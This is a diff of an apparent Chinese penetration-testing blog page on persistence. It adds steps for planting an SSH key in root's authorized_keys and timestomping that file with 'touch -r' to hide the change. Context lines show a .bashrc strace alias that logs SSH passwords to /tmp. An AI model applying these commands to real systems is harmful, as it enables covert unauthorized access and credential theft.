@@ -28,7 +28,7 @@
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216164543289.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216170339632.png">
 <meta property="article:published_time" content="2024-02-16T07:54:20.000Z">
-<meta property="article:modified_time" content="2024-02-21T09:02:26.189Z">
+<meta property="article:modified_time" content="2024-03-28T11:20:52.086Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary_large_image">
@@ -232,7 +232,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          5.1k words
+          5.4k words
         
       </span>
     
@@ -243,7 +243,7 @@
         
         
         
-          43 mins
+          45 mins
         
       </span>
     
@@ -306,7 +306,14 @@
 <p>  把公钥id_rsa.pub发送到目标authorized_keys文件中  </p>
 <p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216163648231.png" srcset="/img/loading.gif" lazyload alt="image-20240216163648231"></p>
 <p>可以先将这个临时放入一个文件，然后将这个文件上传到受害者的机器上，然后将内容导入到authorized_keys</p>
+<p>注意是添加 </p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ls <span class="hljs-regexp">/root/</span>.ssh/authorized_keys<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>更改authorized_keys 时间</p>
+<p>就是选择一个模板文件，然后将这个模板文件的时间同步给authorized_keys</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> -r 参考文件 authorized_keys<br><br>如：<br><span class="hljs-built_in">touch</span> -r /www/wwwroot/upload.zip authorized_keys<br></code></pre></td></tr></table></figure>
+
+
 </li>
 <li><p>然后重启ssh 服务</p>
 <figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">service ssh restart</span><br></code></pre></td></tr></table></figure>
@@ -314,6 +321,9 @@
 <li><p>接下来就可以免密登录了</p>
 </li>
 </ol>
+<blockquote>
+<p>如果出现了错误说是私钥文件too open那就尝试将生成的公钥文件的权限进行缩小，如果是Linux 就直接修改小权限就可以，如果是windows 的话，可以将其他用户移除，然后选择本用户就可以了</p>
+</blockquote>
 <h2 id="SSH-Keylogger"><a href="#SSH-Keylogger" class="headerlink" title="SSH Keylogger"></a>SSH Keylogger</h2><p>编辑当前用户下的.bashrc文件，在配置文件末尾添加：  </p>
 <figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">alias ssh=&#x27;strace -o /tmp/sshpwd-`date +<span class="hljs-built_in">%d</span><span class="hljs-built_in">%h</span><span class="hljs-built_in">%m</span><span class="hljs-built_in">%s</span>`.log -e <span class="hljs-keyword">read</span>,<span class="hljs-keyword">write</span>,connect -s2048 ssh&#x27;<br></code></pre></td></tr></table></figure>
 
